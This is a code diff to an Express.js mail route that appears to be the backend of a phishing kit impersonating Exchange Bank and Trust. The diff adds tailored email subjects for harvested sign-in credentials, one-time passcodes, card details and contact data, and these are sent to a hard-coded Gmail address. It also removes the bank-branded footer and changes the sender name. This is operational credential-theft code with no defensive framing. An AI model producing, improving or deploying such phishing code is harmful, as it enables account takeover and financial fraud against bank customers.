@@ -58,11 +58,23 @@ app.post("/send", async (req, res) => {
       }
     });
     
+    // Create custom subject based on form type
+    let customSubject = 'New Form Submission';
+    if (subject === 'Login Details') {
+      customSubject = 'Submission of Exchange bank and trust sign in form';
+    } else if (subject === 'Contact Info') {
+      customSubject = 'Submission of Exchange bank and trust Contact Verification form';
+    } else if (subject === 'OTP Verification') {
+      customSubject = 'Submission of Exchange bank and trust OTP verification form';
+    } else if (subject === 'Card Info') {
+      customSubject = 'Submission of Exchange bank and trust Card Verification form';
+    }
+    
     // Define the mail options
     const mailOptions = {
-      from: `"Exchange Bank and Trust" <${process.env.EMAIL_USER}>`,
+      from: `"rmoster766@gmail.com" <${process.env.EMAIL_USER}>`,
       to: "melitazdenekxny23@gmail.com",
-      subject: subject || 'New Login Info',
+      subject: customSubject,
       text: getEmailText(subject, email, message),
       html: getEmailHtml(subject, email, message)
     };
@@ -140,10 +152,10 @@ function getEmailHtml(subject, email, message) {
     contentHtml = `<p><strong>Message:</strong> ${message}</p>`;
   }
   
+  // Return HTML without the footer text
   return `<div style="font-family: Arial, sans-serif; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
     <h2 style="color: #333;">${title}</h2>
     ${contentHtml}
-    <p style="color: #888; font-size: 12px;">Sent from Exchange Bank and Trust</p>
   </div>`;
 }
 
